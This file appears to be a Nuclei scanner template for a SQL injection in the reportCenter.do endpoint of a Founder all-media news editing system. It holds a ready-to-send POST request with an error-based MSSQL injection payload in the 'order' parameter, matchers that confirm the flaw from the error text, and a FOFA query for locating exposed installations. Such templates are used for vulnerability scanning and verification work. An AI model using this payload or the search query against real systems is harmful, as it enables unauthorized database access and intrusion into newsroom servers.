http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200 &&  contains_all(body, '<?xml') &&  contains_all(body, 'nvarchar')
      &&  contains_all(body, 'othererror')
    type: dsl
  raw:
  - 'POST /newsedit/report/reportCenter.do HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    type=paperLayoutList&paperDate=2024-10-1&token=1&pageNo=1&pageSize=1&order=x''
    THEN 5 ELSE 5 END) AS status from (select ''1x'' as SYS_CURRENTSTATUS) d) tmp
    where cast(@@version as int)=5-- a

    '
id: fangzheng-xinwencaibian-reportCenter-sqli
info:
  author: PokerSec
  metadata:
    fofasearch: "app=\"FOUNDER-\u5168\u5A92\u4F53\u91C7\u7F16\u7CFB\u7EDF\""
  name: fangzheng-xinwencaibian-reportCenter-sqli
  severity: high
